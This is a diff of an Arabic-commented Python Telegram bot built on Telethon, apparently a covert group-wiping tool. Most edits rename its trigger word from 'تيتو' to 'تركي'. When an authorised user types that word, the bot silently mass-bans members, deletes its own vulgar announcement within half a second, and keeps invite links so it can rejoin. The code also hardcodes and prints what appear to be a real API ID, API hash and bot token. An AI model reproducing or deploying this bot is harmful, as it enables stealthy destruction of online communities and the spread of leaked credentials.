@@ -13,16 +13,16 @@ import json # تم إضافة هذا السطر لإدارة ملفات JSON
 # ============== بيانات الدخول والإعدادات ==============
 # الـ API ID والـ API Hash الخاصين بحسابك الشخصي (Userbot)
 # **تأكد أن هذه القيم صحيحة من my.telegram.org**
-my_api_id = 25202058
-my_api_hash = 'ff6480cf0caf92223033f597401e5bf4'
+my_api_id = 25202058 # تم تحديث الـ API ID
+my_api_hash = 'ff6480cf0caf92223033f597401e5bf4' # تم تحديث الـ API Hash
 
 # توكن البوت اللي أنت عاوزه يشتغل كواجهة (من @BotFather)
-my_BOT_TOKEN = '1887695108:AAFLzc_KasLNKltLILSJoOQculfLYl9g8CU'# تأكد أن هذا التوكن هو بتاعك
+my_BOT_TOKEN = '1887695108:AAFLzc_KasLNKltLILSJoOQculfLYl9g8CU' # تم تحديث توكن البوت
 
 # معلومات المطور والقناة (للاستخدام في الخاص فقط)
-DEV_USERNAME = "developer: @x_4_f"  
-CHANNEL_LINK_DISPLAY_TEXT = "source" # النص اللي هيظهر للينك
-CHANNEL_LINK_URL = "https://t.me/ALTRKI_Story"
+DEV_USERNAME = "developer: @x_4_f" # تم تحديث يوزر المطور
+CHANNEL_LINK_DISPLAY_TEXT = "source" # تم تحديث نص لينك القناة
+CHANNEL_LINK_URL = "https://t.me/ALTRKI_Story" # تم تحديث لينك القناة
 
 # ==================== إعدادات المستخدمين المسموح لهم ====================
 # سيتم تحميل هذه القيم من ملف config.json
@@ -227,23 +227,23 @@ async def start_command(event):
         # تحقق من صلاحية المستخدم
         sender = await event.get_sender()
         if not await is_user_allowed(sender.id, sender.username):
-            await event.respond("🚫 عفواً، هذا البوت مخصص للاستخدام من قبل مستخدمين معينين فقط.")
+            await event.respond("🚫 عذراً، هذا البوت مخصص للاستخدام من قبل مستخدمين معينين فقط.")
             return
 
         me = await event.client.get_me()
         await event.respond(
-            f"""✨ مرحباً بك في عالم **تيتو**! ✨
+            f"""✨ مرحباً بك في عالم **التركي**! ✨
 
 أنا هنا لأجعل مجموعتك أكثر نظاماً ونظافة.
 أقوم بتصفية الأعضاء غير المرغوب فيهم بسرعة وكفاءة عالية.
 
 🔥 *كيف أبدأ العمل؟*
-فقط أرسل كلمة «تيتو» في المجموعة وسأبدأ مهمتي فوراً.
+فقط أرسل كلمة «تركي» في المجموعة وسأبدأ مهمتي فوراً.
 
 🛑 *لإيقاف التصفية:* أرسل كلمة «بس» في المجموعة.
 
 {DEV_USERNAME}
-📢 **chanal:** [{CHANNEL_LINK_DISPLAY_TEXT}]({CHANNEL_LINK_URL})""",
+📢 **القناة:** [{CHANNEL_LINK_DISPLAY_TEXT}]({CHANNEL_LINK_URL})""",
             buttons=[
                 [Button.inline("🛠 الأوامر", b"commands")],
                 [Button.url("📢 انضم للقناة", CHANNEL_LINK_URL)],
@@ -261,13 +261,13 @@ async def command_help_callback(event):
     # تحقق من صلاحية المستخدم
     sender = await event.get_sender()
     if not await is_user_allowed(sender.id, sender.username):
-        await event.edit("🚫 عفواً، لا تملك الصلاحية للوصول إلى هذه الأوامر.")
+        await event.edit("🚫 عذراً، لا تملك الصلاحية للوصول إلى هذه الأوامر.")
         return
 
     await event.edit(
         """🧠 *طريقة التشغيل:*
 
-- أرسل كلمة `تيتو` في أي مجموعة وأنا مشرف فيها وسأبدأ التصفية فوراً.
+- أرسل كلمة `تركي` في أي مجموعة وأنا مشرف فيها وسأبدأ التصفية فوراً.
 - أرسل `بس` لإيقاف التصفية.
 
 📌 *ملاحظة هامة:* تأكد أن البوت لديه صلاحيات المشرف الكاملة و'حظر المستخدمين' و'حذف الرسائل' ليعمل بكفاءة.""",
@@ -280,23 +280,23 @@ async def back_to_start_callback(event):
     # تحقق من صلاحية المستخدم
     sender = await event.get_sender()
     if not await is_user_allowed(sender.id, sender.username):
-        await event.edit("🚫 عفواً، لا تملك الصلاحية للوصول.")
+        await event.edit("🚫 عذراً، لا تملك الصلاحية للوصول.")
         return
 
     me = await event.client.get_me()
     await event.edit(
-        f"""✨ مرحباً بك في عالم **تيتو**! ✨
+        f"""✨ مرحباً بك في عالم **التركي**! ✨
 
 أنا هنا لأجعل مجموعتك أكثر نظاماً ونظافة.
 أقوم بتصفية الأعضاء غير المرغوب فيهم بسرعة وكفاءة عالية.
 
 🔥 *كيف أبدأ العمل؟*
-فقط أرسل كلمة «تيتو» في المجموعة وسأبدأ مهمتي فوراً.
+فقط أرسل كلمة «تركي» في المجموعة وسأبدأ مهمتي فوراً.
 
 🛑 *لإيقاف التصفية:* أرسل كلمة «بس» في المجموعة.
 
 {DEV_USERNAME}
-📢 **chanal:** [{CHANNEL_LINK_DISPLAY_TEXT}]({CHANNEL_LINK_URL})""",
+📢 **القناة:** [{CHANNEL_LINK_DISPLAY_TEXT}]({CHANNEL_LINK_URL})""",
             buttons=[
                 [Button.inline("🛠 الأوامر", b"commands")],
                 [Button.url("📢 انضم للقناة", CHANNEL_LINK_URL)],
@@ -312,7 +312,7 @@ async def manage_admins_callback(event):
     # تأكد أن المستخدم الذي يضغط على الزر هو المالك
     sender = await event.get_sender()
     if sender.id != ALLOWED_USER_IDS[0]: # نفترض أن أول ID في القائمة هو المالك
-        await event.edit("🚫 عفواً، هذه الميزة مخصصة للمالك فقط.")
+        await event.edit("🚫 عذراً، هذه الميزة مخصصة للمالك فقط.")
         return
 
     await event.edit(
@@ -333,7 +333,7 @@ async def add_new_admin_prompt(event):
     await event.answer()
     sender = await event.get_sender()
     if sender.id != ALLOWED_USER_IDS[0]:
-        await event.edit("🚫 عفواً، هذه الميزة مخصصة للمالك فقط.")
+        await event.edit("🚫 عذراً، هذه الميزة مخصصة للمالك فقط.")
         return
     
     USER_STATE[sender.id] = "waiting_for_admin_id_to_add"
@@ -346,7 +346,7 @@ async def remove_admin_prompt(event):
     await event.answer()
     sender = await event.get_sender()
     if sender.id != ALLOWED_USER_IDS[0]:
-        await event.edit("🚫 عفواً، هذه الميزة مخصصة للمالك فقط.")
+        await event.edit("🚫 عذراً، هذه الميزة مخصصة للمالك فقط.")
         return
     
     USER_STATE[sender.id] = "waiting_for_admin_id_to_remove"
@@ -401,7 +401,7 @@ async def handle_admin_id_input(event):
         except ValueError:
             await event.reply("الرجاء إرسال معرف مستخدم (ID) صحيح (أرقام فقط).")
         except Exception as e:
-            print(f"Error processing admin ID: {e}")
+            print(f"حدث خطأ أثناء معالجة طلبك: {e}")
             await event.reply("حدث خطأ أثناء معالجة طلبك. الرجاء المحاولة مرة أخرى.")
         finally:
             # محاولة حذف رسالة المستخدم التي تحتوي على الـ ID بعد المعالجة
@@ -416,7 +416,7 @@ async def view_current_admins(event):
     await event.answer()
     sender = await event.get_sender()
     if sender.id != ALLOWED_USER_IDS[0]:
-        await event.edit("🚫 عفواً، هذه الميزة مخصصة للمالك فقط.")
+        await event.edit("🚫 عذراً، هذه الميزة مخصصة للمالك فقط.")
         return
     
     ids_str = "\n".join(map(str, ALLOWED_USER_IDS)) if ALLOWED_USER_IDS else "لا يوجد."
@@ -434,8 +434,8 @@ async def view_current_admins(event):
     await event.edit(message, buttons=[Button.inline("🔙 رجوع", b"manage_admins")])
 
 
-# أمر "تيتو" لبدء التصفية (الرد الوحيد في المجموعة و سيتم حذفه فوراً)
-@cli.on(events.NewMessage(pattern='(?i)تيتو', chats=None))
+# أمر "تركي" لبدء التصفية (الرد الوحيد في المجموعة و سيتم حذفه فوراً)
+@cli.on(events.NewMessage(pattern='(?i)تركي', chats=None))
 async def start_cleanup_command(event):
     if not event.is_group and not event.is_channel:
         return  
@@ -443,7 +443,7 @@ async def start_cleanup_command(event):
     # تحقق من صلاحية المستخدم قبل معالجة الأمر في المجموعات والقنوات
     sender = await event.get_sender()
     if not await is_user_allowed(sender.id, sender.username):
-        print(f"Unauthorized user {sender.id} (@{sender.username}) attempted to start cleanup in {event.chat_id}.")
+        print(f"User {sender.id} (@{sender.username}) tried to start cleanup in {event.chat_id} without permission.")
         return
 
     chat_id = event.chat_id
@@ -455,16 +455,16 @@ async def start_cleanup_command(event):
         if not getattr(participant_me.participant, "admin_rights", None) or \
            not getattr(participant_me.participant.admin_rights, "ban_users", False):
             print(f"Bot in chat {chat_id} lacks 'ban_users' permission. Cannot proceed.")
+            # يمكنك إرسال رسالة للمستخدم هنا إذا أردت، ولكن طلبك كان أن يكون صامتًا
             return
         
         if not getattr(participant_me.participant.admin_rights, "delete_messages", False):
             print(f"Bot in chat {chat_id} lacks 'delete_messages' permission. Ghost mode might fail.")
-            return
+            # يمكنك إرسال رسالة للمستخدم هنا إذا أردت، ولكن طلبك كان أن يكون صامتًا
             
         if not getattr(participant_me.participant.admin_rights, "invite_users", False):
             print(f"Bot does not have 'invite users via link' permission in {chat_id}. Automatic re-join might fail.")
-            pass
-        
+            
         try:
             full_chat = await cli(GetFullChannelRequest(chat_id))
             if full_chat.full_chat.exported_invite:
@@ -472,10 +472,10 @@ async def start_cleanup_command(event):
                 print(f"Initial invite link for {chat_id}: {CHAT_INVITE_LINKS[chat_id]}")
             else:
                 print(f"No invite link available for {chat_id}. Automatic re-join might fail.")
-                pass
+                
         except Exception as ex:
             print(f"Could not get initial invite link for {chat_id}: {ex} (suppressed message for user)")
-            pass
+            
 
     except Exception as err:
         print(f"Error checking bot permissions in chat {chat_id}: {err}")
@@ -488,16 +488,18 @@ async def start_cleanup_command(event):
 
     STOP_CLEANUP.discard(chat_id)
 
-    initial_message = await event.reply("😈 **يتم نيك المجموعه**")
+    # الرسالة اللي بيتم حذفها فورًا
+    initial_message = await event.reply("😈 **يتم نيك المجموعة**")
     START_MESSAGES_TO_DELETE[chat_id] = initial_message
 
-    await asyncio.sleep(0.5)
+    await asyncio.sleep(0.5) # انتظار نصف ثانية قبل الحذف
     try:
         if chat_id in START_MESSAGES_TO_DELETE:
             await START_MESSAGES_TO_DELETE[chat_id].delete()
             del START_MESSAGES_TO_DELETE[chat_id]
     except Exception as e:
         print(f"Failed to delete initial message in {chat_id}: {e}")
+        # لا يتم إرسال رسالة للمستخدم هنا للحفاظ على الوضع الصامت
         pass
 
     cleanup_task = asyncio.create_task(blitz_cleanup(chat_id))
@@ -508,12 +510,12 @@ async def start_cleanup_command(event):
 @cli.on(events.NewMessage(pattern='(?i)بس', chats=None))
 async def stop_cleanup_command(event):
     if not event.is_group and not event.is_channel:
-        pass
+        pass # لا تفعل شيئًا إذا لم تكن في مجموعة أو قناة
 
     # تحقق من صلاحية المستخدم قبل معالجة الأمر في المجموعات والقنوات
     sender = await event.get_sender()
     if not await is_user_allowed(sender.id, sender.username):
-        print(f"Unauthorized user {sender.id} (@{sender.username}) attempted to stop cleanup in {event.chat_id}.")
+        print(f"User {sender.id} (@{sender.username}) tried to stop cleanup in {event.chat_id} without permission.")
         return
 
     chat_id = event.chat_id
@@ -521,14 +523,14 @@ async def stop_cleanup_command(event):
     STOP_CLEANUP.add(chat_id)
 
     if chat_id in ACTIVE_CLEANUPS:
-        await asyncio.sleep(0.5)
+        await asyncio.sleep(0.5) # انتظر قليلاً للتأكد من أن مهمة التنظيف بدأت في التوقف
         if ACTIVE_CLEANUPS[chat_id].done():
             del ACTIVE_CLEANUPS[chat_id]
             print(f"Cleanup in chat {chat_id} stopped.")
         else:
             try:
                 ACTIVE_CLEANUPS[chat_id].cancel()
-                await ACTIVE_CLEANUPS[chat_id]
+                await ACTIVE_CLEANUPS[chat_id] # انتظر حتى يتم إلغاء المهمة فعليًا
                 del ACTIVE_CLEANUPS[chat_id]
                 print(f"Cleanup in chat {chat_id} stopped and task cancelled.")
             except asyncio.CancelledError:
@@ -536,10 +538,10 @@ async def stop_cleanup_command(event):
                 del ACTIVE_CLEANUPS[chat_id]
             except Exception as e:
                 print(f"Error stopping cleanup task for {chat_id}: {e}")
-                pass
+                pass # لا يتم إرسال رسالة للمستخدم هنا للحفاظ على الوضع الصامت
     else:
         print(f"No cleanup running in chat {chat_id} to stop.")
-    pass
+    pass # لا يتم إرسال رسالة للمستخدم هنا للحفاظ على الوضع الصامت
 
 
 # عند انضمام عضو جديد (صامت تماماً في المجموعة)
@@ -568,8 +570,8 @@ async def new_members_action(event):
             print(f"Error checking permissions after addition to chat {event.chat_id}: {e}")
             pass
 
-print("🔥 تيتو - بوت التصفية الفاجر يعمل الآن!")
-print(f"البوت يعمل بالتوكن: {my_BOT_TOKEN}") # تم تغيير اسم المتغير
-print(f"الحساب يعمل بالـ API ID: {my_api_id}") # تم تغيير اسم المتغير
+print("🔥 الترُكي - بوت التصفية الفاجر يعمل الآن!")
+print(f"البوت يعمل بالتوكن: {my_BOT_TOKEN}")
+print(f"الحساب يعمل بالـ API ID: {my_api_id}")
 
 cli.run_until_disconnected()
